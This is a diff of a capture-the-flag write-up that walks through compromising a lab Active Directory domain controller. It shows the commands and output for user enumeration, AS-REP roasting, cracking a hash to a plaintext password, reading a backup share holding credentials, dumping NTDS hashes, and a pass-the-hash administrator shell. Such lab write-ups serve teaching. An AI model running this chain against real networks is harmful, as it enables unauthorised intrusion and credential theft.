@@ -19,7 +19,7 @@ As always we start with rustscan  I like its style and it instantly gives a resp
 rustscan $IP -- -A -sC -sV -oN nmap.txt
 ````````
 
-````````
+````````python
 .----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
 | {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
 | .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
@@ -278,7 +278,7 @@ I have tried to log in to the SMB with anonymous access but it failed because it
 ./kerbrute_linux_amd64 userenum -d spookysec.local --dc $IP userlist.txt
 ````````
 
-````````
+````````python
     __             __               __     
    / /_____  _____/ /_  _______  __/ /____ 
   / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
@@ -312,7 +312,7 @@ so we have some valid user names I have tried all of them and succeeded with onl
 GetNPUsers.py  spookysec.local/svc-admin -dc-ip $IP -no-pass -request
 ````````
 
-````````
+````````python
 Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
 
 [*] Getting TGT for svc-admin
@@ -329,7 +329,7 @@ for finding what kind of hash is it and its mode we use a tool called name-that-
 nth -f hash.txt 
 ````````
 
-````````
+````````python
                                                               
   _   _                           _____ _           _          _   _           _     
  | \ | |                         |_   _| |         | |        | | | |         | |    
@@ -357,7 +357,7 @@ so we have find the mode and the hash type let's use hashcat and cracked that sh
 hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt --force
 ````````
 
-````````
+````````python
 hashcat (v6.2.5) starting
 
 You have enabled --force to bypass dangerous warnings and errors!
@@ -429,7 +429,7 @@ YEA!! we have cracked the hash. what next?  let's do some more enumeration. reme
 smbmap -u svc-admin -p management2005 -H $IP
 ````````
 
-````````
+````````python
 [+] IP: 10.10.181.198:445	Name: 10.10.181.198                                     
         Disk                                                  	Permissions	Comment
 	----                                                  	-----------	-------
@@ -449,7 +449,7 @@ ok, we have read-only access to the backup folder let's see what's inside.
 smbclient  \\\\$IP\\backup -U svc-admin
 ````````
 
-````````     
+````````python    
 Password for [WORKGROUP\svc-admin]:
 Try "help" to get a list of possible commands.
 smb: \> prompt off
@@ -471,7 +471,7 @@ backup_credentials.txt > {REDACTED}
 echo "{REDACTED}" | base64 -d
 ````````
 
-````````
+````````python
 backup@spookysec.local:{REDACTED}                                                                                                                                                          
 ````````
 YESSS!!. it's the username and password of the user backup.
@@ -484,7 +484,7 @@ let's 3 if we can dump the ntds with the help of secretsdump by the credential.
 secretsdump.py spookysec.local/backup:{REDACTED}@10.10.181.198
 ````````
 
-````````
+````````python
 Impacket v0.10.1.dev1+20220504.120002.d5097759 - Copyright 2022 SecureAuth Corporation
 
 [-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
@@ -571,7 +571,7 @@ we have successfully dump the ntds now we can log in as administrator and get th
 evil-winrm -u Administrator -H {REDACTED} -i $IP
 ````````
 
-````````
+````````python
 Evil-WinRM shell v3.3
 
 Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
